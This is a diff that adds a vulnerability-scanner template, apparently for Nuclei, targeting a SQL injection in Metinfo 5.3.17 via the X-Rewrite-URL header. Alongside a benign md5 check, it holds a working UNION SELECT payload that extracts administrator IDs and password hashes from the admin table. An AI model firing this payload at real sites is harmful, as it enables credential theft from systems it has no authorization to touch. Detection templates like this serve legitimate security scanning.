@@ -1,0 +1,45 @@
+id: metinfo-5-3-17-x-rewrite-url-sqli
+info:
+  name: Metinfo 5.3.17 X-Rewrite-URL SQLi
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Metinfo is a content management system (CMS) developed by Changsha Mituo Information Technology Co., Ltd. in China, which is built using PHP and MySQL. This template detects a SQL injection vulnerability leveraging the `X-Rewrite-URL` header.
+  reference:
+    - https://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html
+
+variables:
+  sql_payload: "union select group_concat(admin_id,0x2c,admin_pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from met_admin_table limit 1"
+
+http:
+  - raw:
+      - |
+        GET /index.php?lang=Cn&index=1 HTTP/1.1
+        Host: {{Hostname}}
+        X-Rewrite-URL: 1/2/404xxx' union select md5(0x0c),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "58c89562f58fd276f592420068db8c09"
+
+  - raw:
+      - |
+        GET /index.php?lang=Cn&index=1 HTTP/1.1
+        Host: {{Hostname}}
+        X-Rewrite-URL: 1/2/404xxx' {{sql_payload}}#/index.php
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 301
+
+    extractors:
+      - type: regex
+        name: output
+        internal: true
+        regex:
+          - "(?s)list-(.*?)-Cn"
